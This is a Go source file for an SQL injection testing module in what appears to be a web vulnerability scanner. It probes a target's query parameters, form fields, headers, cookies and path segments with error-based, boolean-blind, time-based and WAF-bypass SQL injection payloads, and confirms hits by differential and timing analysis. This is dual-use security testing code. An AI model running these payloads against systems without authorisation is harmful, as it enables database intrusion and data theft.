package core

import (
	"context"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"fire_starter/src/modules/core/generator"

	"github.com/charmbracelet/log"
)

type SQLCmdType string

const (
	SQLCmdError     SQLCmdType = "error_based"
	SQLCmdBoolean   SQLCmdType = "boolean_blind"
	SQLCmdTimeBased SQLCmdType = "time_blind"
)

type SQLPayload struct {
	Value       string
	VerifyValue string // For differential analysis
	Type        SQLCmdType
	DB          string // "mysql", "postgres", etc.
}

// SQLInjectionTestingResult holds the result of the SQLInjectionTesting module execution.
type SQLInjectionTestingResult struct {
	Target  string `json:"target"`
	Payload string `json:"payload"`
	Status  string `json:"status"`
	Detail  string `json:"detail,omitempty"`
}

// SQLInjectionTesting executes the sql_injection_testing security technique.
// Description: inject malicious SQL statements into user input fields to manipulate database queries
type SQLInjectionTesting struct {
	BaseModule
	Target    string
	Threshold time.Duration
	results   []SQLInjectionTestingResult
	// timeMu serializes time-based probes and the baselines measured against
	// them so one vector's sleep cannot inflate another vector's duration.
	timeMu sync.Mutex
	// probeFailures counts transport/read failures; guarded by Mu.
	probeFailures int
}

// NewSQLInjectionTesting creates a new instance of SQLInjectionTesting.
func NewSQLInjectionTesting(target string) *SQLInjectionTesting {
	target = EnsureHTTPPrefix(target)
	return &SQLInjectionTesting{
		BaseModule: BaseModule{
			Client:     NewHTTPClient(15 * time.Second),
			MaxThreads: 5,
		},
		Target:    target,
		Threshold: 4 * time.Second,
	}
}

// SetThreshold sets the time threshold for blind time-based injection detection.
func (m *SQLInjectionTesting) SetThreshold(threshold time.Duration) {
	m.Threshold = threshold
}

var sqlErrors = []string{
	"you have an error in your sql syntax",
	"warning: mysql",
	"unclosed quotation mark after the character string",
	"quoted string not properly terminated",
	"pg_query(): query failed: error:",
	"sqlite3.operationalerror:",
	"sqlite3.programmingerror:",
	"syntax error or access violation",
	"sql syntax error",
	"mysql_fetch_array()",
	"ora-01756",
}

type SQLValidator struct {
	Threshold        time.Duration
	BaselineDuration time.Duration
}

// timeThreshold returns the minimum duration a time-based probe must exceed to be
// considered a candidate: the configured threshold above the measured baseline
// duration (or the raw threshold when no positive baseline was captured).
func (v *SQLValidator) timeThreshold() time.Duration {
	if v.BaselineDuration > 0 {
		return v.BaselineDuration + v.Threshold
	}
	return v.Threshold
}

func (v *SQLValidator) IsVulnerable(resp *http.Response, body string, payload SQLPayload, duration time.Duration, baseBody string) bool {
	bodyLower := strings.ToLower(body)

	switch payload.Type {
	case SQLCmdError:
		// A marker already present in the baseline body is not evidence of
		// injection (broken query, generic 500 page with a stack trace).
		baseLower := strings.ToLower(baseBody)
		for _, sqlErr := range sqlErrors {
			if strings.Contains(bodyLower, sqlErr) && !strings.Contains(baseLower, sqlErr) {
				return true
			}
		}
	case SQLCmdTimeBased:
		if duration >= v.timeThreshold() {
			return true
		}
	case SQLCmdBoolean:
		// When a verify value is present, trigger candidate evaluation for differential testing
		if payload.VerifyValue != "" {
			return true
		}
		if baseBody != "" && body != baseBody {
			return true
		}
	}
	return false
}

var defaultSQLPayloads = []SQLPayload{
	{Value: "'", Type: SQLCmdError},
	{Value: "\"", Type: SQLCmdError},
	{Value: "';--", Type: SQLCmdError},
	{Value: "' or '1'='1", Type: SQLCmdBoolean, VerifyValue: "' and '1'='2"},
	{Value: "' OR 1=1--", Type: SQLCmdBoolean, VerifyValue: "' OR 1=2--"},
	{Value: "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--", Type: SQLCmdTimeBased, DB: "mysql"},
	{Value: "' AND (SELECT 1 FROM pg_sleep(5))--", Type: SQLCmdTimeBased, DB: "postgres"},
}

// getCombinedSQLPayloads combines static default payloads with dynamic PolyglotGenerator payloads.
// Always-true polyglots are mapped to boolean-blind payloads paired with a false variant so
// they are judged by differential analysis instead of error markers they never emit.
// The result is deduplicated by normalized payload value and built once per scan.
func getCombinedSQLPayloads() []SQLPayload {
	payloads := append([]SQLPayload(nil), defaultSQLPayloads...)
	polyGen := generator.NewPolyglotGenerator()

	// Universal and WAF-bypass polyglots are always-true conditions; pair each with a
	// false variant for differential judging. Polyglots without a derivable false
	// condition keep their original classification.
	for _, poly := range polyGen.GenerateUniversalPolyglots() {
		if verify, ok := sqlTrueToFalseVariant(poly.Payload); ok {
			payloads = append(payloads, SQLPayload{
				Value:       poly.Payload,
				VerifyValue: verify,
				Type:        SQLCmdBoolean,
			})
			continue
		}
		payloads = append(payloads, SQLPayload{
			Value: poly.Payload,
			Type:  SQLCmdError,
		})
	}
	for _, poly := range polyGen.GenerateWAFBypassPolyglots() {
		if verify, ok := sqlTrueToFalseVariant(poly.Payload); ok {
			payloads = append(payloads, SQLPayload{
				Value:       poly.Payload,
				VerifyValue: verify,
				Type:        SQLCmdBoolean,
			})
			continue
		}
		payloads = append(payloads, SQLPayload{
			Value: poly.Payload,
			Type:  SQLCmdBoolean,
		})
	}
	for _, poly := range polyGen.GenerateTimeBasedPolyglots() {
		dbms := ""
		if len(poly.DBMS) > 0 {
			dbms = poly.DBMS[0]
		}
		payloads = append(payloads, SQLPayload{
			Value: poly.Payload,
			Type:  SQLCmdTimeBased,
			DB:    dbms,
		})
	}

	seen := make(map[string]struct{}, len(payloads))
	deduped := payloads[:0]
	for _, p := range payloads {
		key := strings.ToLower(strings.TrimSpace(p.Value))
		if _, dup := seen[key]; dup {
			continue
		}
		seen[key] = struct{}{}
		deduped = append(deduped, p)
	}
	return deduped
}

// sqlTrueToFalseVariant derives the false condition for an always-true polyglot by
// flipping the last comparison operand (e.g. "1/**/AND/**/1=1--" → "1/**/AND/**/1=2--").
func sqlTrueToFalseVariant(payload string) (string, bool) {
	idx := strings.LastIndex(payload, "1")
	if idx < 0 {
		return "", false
	}
	return payload[:idx] + "2" + payload[idx+1:], true
}

// Execute performs the module's core tasks concurrently using discovery.
func (m *SQLInjectionTesting) Execute(ctx context.Context) ([]SQLInjectionTestingResult, error) {
	m.Mu.Lock()
	m.results = make([]SQLInjectionTestingResult, 0)
	m.probeFailures = 0
	m.Mu.Unlock()

	parsedURL, err := url.Parse(m.Target)
	if err != nil {
		return nil, fmt.Errorf("failed to parse target URL: %v", err)
	}

	// 1. Discover Input Vectors
	vectors, _, derr := m.DiscoverVectors(parsedURL, nil, "", nil)
	if derr != nil {
		return nil, derr
	}
	if len(vectors) == 0 {
		vectors = append(vectors,
			InputVector{Type: VectorQueryParam, Key: "id", Value: "1"},
			InputVector{Type: VectorQueryParam, Key: "q", Value: "test"},
			InputVector{Type: VectorQueryParam, Key: "search", Value: "test"},
			InputVector{Type: VectorQueryParam, Key: "query", Value: "test"},
			InputVector{Type: VectorQueryParam, Key: "user", Value: "admin"},
		)
	}

	payloads := getCombinedSQLPayloads()

	var wg sync.WaitGroup
	semaphore := make(chan struct{}, m.MaxThreads)
	baselineFailures := 0
	for _, vector := range vectors {
		// Get base response for differential analysis. Time-based probes hold
		// timeMu, so the baseline must be measured under the same lock.
		m.timeMu.Lock()
		baseBody, baseDuration, err := m.getBaseResponse(ctx, parsedURL, vector)
		m.timeMu.Unlock()
		if err != nil {
			// Log and continue with other vectors
			log.Warnf("Warning: failed to get base response for vector %s: %v", vector.Key, err)
			baselineFailures++
			continue
		}

		validator := &SQLValidator{
			Threshold:        m.Threshold,
			BaselineDuration: baseDuration,
		}

		for _, payload := range payloads {
			wg.Add(1)
			go func(v InputVector, p SQLPayload, base string) {
				defer wg.Done()
				semaphore <- struct{}{}
				defer func() { <-semaphore }()

				select {
				case <-ctx.Done():
					return
				default:
					m.testVector(ctx, parsedURL, v, p, base, validator)
				}
			}(vector, payload, baseBody)
		}
	}

	wg.Wait()

	// Never render an all-failed scan as a clean result.
	m.Mu.Lock()
	empty := len(m.results) == 0
	probeFailures := m.probeFailures
	m.Mu.Unlock()
	if empty && probeFailures+baselineFailures > 0 {
		detail := formatEvidenceDetail(EvidenceWeak, fmt.Sprintf(
			"No SQL injection probe completed successfully: %d baseline failures, %d probe transport/read failures",
			baselineFailures, probeFailures))
		m.Mu.Lock()
		m.results = append(m.results, SQLInjectionTestingResult{
			Target: m.Target,
			Status: statusFromEvidence(EvidenceWeak, false),
			Detail: detail,
		})
		m.Mu.Unlock()
	}
	return m.results, nil
}

func (m *SQLInjectionTesting) getBaseResponse(ctx context.Context, u *url.URL, vector InputVector) (string, time.Duration, error) {
	// Send request with original vector value to get a baseline
	req, err := m.createRequest(ctx, u, vector, vector.Value)
	if err != nil {
		return "", 0, err
	}

	start := time.Now()
	resp, err := m.Client.Do(req)
	if err != nil {
		return "", 0, err
	}
	defer resp.Body.Close()

	duration := time.Since(start)
	body, _ := ReadBoundedBody(resp.Body, MaxResponseBodyBytes)
	return string(body), duration, nil
}

func (m *SQLInjectionTesting) createRequest(ctx context.Context, u *url.URL, vector InputVector, value string) (*http.Request, error) {
	var req *http.Request
	var err error

	switch vector.Type {
	case VectorQueryParam:
		newU, _ := url.Parse(u.String())
		q := newU.Query()
		q.Set(vector.Key, value)
		newU.RawQuery = q.Encode()
		req, err = http.NewRequestWithContext(ctx, "GET", newU.String(), nil)
	case VectorFormBody:
		form := url.Values{}
		form.Set(vector.Key, value)
		req, err = http.NewRequestWithContext(ctx, "POST", u.String(), strings.NewReader(form.Encode()))
		if req != nil {
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		}
	case VectorHeader:
		req, err = http.NewRequestWithContext(ctx, "GET", u.String(), nil)
		if req != nil {
			if strings.HasPrefix(vector.Key, "Cookie:") {
				cookieName := strings.TrimPrefix(vector.Key, "Cookie:")
				req.AddCookie(&http.Cookie{Name: cookieName, Value: value})
			} else {
				req.Header.Set(vector.Key, value)
			}
		}
	case VectorPathSegment:
		var idx int
		_, _ = fmt.Sscanf(vector.Key, "path[%d]", &idx)
		segments := strings.Split(strings.Trim(u.Path, "/"), "/")
		if idx >= 0 && idx < len(segments) {
			segments[idx] = value
		}
		newPath := "/" + strings.Join(segments, "/")
		newU, _ := url.Parse(u.String())
		newU.Path = newPath
		req, err = http.NewRequestWithContext(ctx, "GET", newU.String(), nil)
	default:
		return nil, fmt.Errorf("unsupported vector type: %s", vector.Type)
	}

	if err != nil {
		return nil, err
	}

	if cookies := m.BaseModule.GetCookies(); cookies != "" {
		req.Header.Set("Cookie", cookies)
	}

	return req, nil
}

func (m *SQLInjectionTesting) testVector(ctx context.Context, u *url.URL, vector InputVector, payload SQLPayload, baseBody string, validator *SQLValidator) {
	// Serialize time-based probes so concurrent SLEEP/WAITFOR/pg_sleep payloads
	// cannot inflate each other's measured duration.
	if payload.Type == SQLCmdTimeBased {
		m.timeMu.Lock()
		defer m.timeMu.Unlock()
	}

	start := time.Now()
	req, err := m.createRequest(ctx, u, vector, payload.Value)
	if err != nil {
		m.recordProbeFailure()
		return
	}

	resp, err := m.Client.Do(req)
	if err != nil {
		m.recordProbeFailure()
		return
	}
	defer resp.Body.Close()

	duration := time.Since(start)
	bodyBytes, err := ReadBoundedBody(resp.Body, MaxResponseBodyBytes)
	if err != nil {
		m.recordProbeFailure()
		return
	}
	body := string(bodyBytes)

	if !validator.IsVulnerable(resp, body, payload, duration, baseBody) {
		return
	}

	switch payload.Type {
	case SQLCmdBoolean:
		if payload.VerifyValue == "" {
			return // Do not flag boolean-blind as vulnerable without differential verification payload
		}
		reqVerify, err := m.createRequest(ctx, u, vector, payload.VerifyValue)
		if err != nil {
			m.recordProbeFailure()
			return
		}
		respVerify, err := m.Client.Do(reqVerify)
		if err != nil {
			m.recordProbeFailure()
			return
		}
		defer respVerify.Body.Close()
		bodyVerifyBytes, err := ReadBoundedBody(respVerify.Body, MaxResponseBodyBytes)
		if err != nil {
			m.recordProbeFailure()
			return
		}
		bodyVerify := string(bodyVerifyBytes)

		// True payload produces a different response than False payload (VerifyValue)
		if bodyVerify == body {
			return
		}
		tier := EvaluateDifferentialEvidence(body, bodyVerify, baseBody, baseBody != "")
		if tier == EvidenceConfirmed {
			detail := fmt.Sprintf("Differential analysis confirmed boolean-blind injection. DB: %s", payload.DB)
			m.RecordPoC(req, nil, detail)
			m.addResult(vector, payload, "vulnerable", detail)
		} else if tier == EvidenceStrong {
			detail := fmt.Sprintf("Boolean-blind injection suspected but baseline confirmation missing. DB: %s", payload.DB)
			m.addResult(vector, payload, "inconclusive", detail)
		}
	case SQLCmdTimeBased:
		// A single slow sample can be an unrelated transient stall: require a
		// confirming second request for the same payload to reproduce the delay.
		confirmStart := time.Now()
		reqConfirm, err := m.createRequest(ctx, u, vector, payload.Value)
		if err != nil {
			m.recordProbeFailure()
			return
		}
		respConfirm, err := m.Client.Do(reqConfirm)
		if err != nil {
			m.recordProbeFailure()
			return
		}
		defer respConfirm.Body.Close()
		if _, err := ReadBoundedBody(respConfirm.Body, MaxResponseBodyBytes); err != nil {
			m.recordProbeFailure()
			return
		}
		if time.Since(confirmStart) < validator.timeThreshold() {
			return
		}
		detail := fmt.Sprintf("SQL injection detected (delay reproduced by confirming request). Type: %s. DB: %s", payload.Type, payload.DB)
		m.RecordPoC(req, nil, detail)
		m.addResult(vector, payload, "vulnerable", detail)
	default:
		detail := fmt.Sprintf("SQL injection detected. Type: %s. DB: %s", payload.Type, payload.DB)
		m.RecordPoC(req, nil, detail)
		m.addResult(vector, payload, "vulnerable", detail)
	}
}

// recordProbeFailure counts a transport/read failure so an all-failed scan can be
// reported as inconclusive instead of a silently empty (clean-looking) result.
func (m *SQLInjectionTesting) recordProbeFailure() {
	m.Mu.Lock()
	m.probeFailures++
	m.Mu.Unlock()
}

func (m *SQLInjectionTesting) addResult(vector InputVector, payload SQLPayload, status string, detail string) {
	m.Mu.Lock()
	defer m.Mu.Unlock()
	m.results = append(m.results, SQLInjectionTestingResult{
		Target:  m.Target,
		Payload: fmt.Sprintf("%s (%s)", payload.Value, vector.Key),
		Status:  status,
		Detail:  detail,
	})
}

func init() {
	RegisterModule("sql_injection_testing", func(payload map[string]any, onLog func(string)) (ExecutableModule, error) {

		target := PayloadString(payload, "url", "")
		onLog(fmt.Sprintf("Starting SQLInjectionTesting on: %s", target))

		tester := NewSQLInjectionTesting(target)
		tester.SetThreads(PayloadInt(payload, "threads", 5))
		threshold := PayloadInt(payload, "threshold", 4)
		tester.SetThreshold(time.Duration(threshold) * time.Second)

		return ModuleWrapper{
			Module: tester,
			ExecuteFunc: func(ctx context.Context) (any, error) {
				return tester.Execute(ctx)
			},
		}, nil
	})
}
